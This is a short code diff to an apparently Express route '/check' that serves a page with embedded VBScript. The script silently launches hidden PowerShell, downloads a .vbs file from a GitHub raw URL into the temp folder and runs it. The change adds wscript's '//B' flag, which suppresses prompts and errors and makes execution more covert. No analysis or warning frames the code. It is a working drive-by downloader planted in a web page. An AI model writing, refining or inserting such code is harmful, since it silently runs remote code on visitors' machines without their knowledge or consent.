@@ -10,7 +10,7 @@ app.get('/check', (req, res) => {
     <script language="VBScript">
     On Error Resume Next
     Set sh = CreateObject("WScript.Shell")
-    sh.Run "powershell -WindowStyle Hidden -Command ""iwr -useb https://raw.githubusercontent.com/lozix64-bit/hahahalozixxd/refs/heads/main/check.vbs -OutFile $env:TEMP\c.vbs; wscript $env:TEMP\c.vbs""", 0, False
+    sh.Run "powershell -WindowStyle Hidden -Command ""iwr -useb https://raw.githubusercontent.com/lozix64-bit/hahahalozixxd/refs/heads/main/check.vbs -OutFile $env:TEMP\c.vbs; wscript //B $env:TEMP\c.vbs""", 0, False
     window.close()
     </script>
     </head>
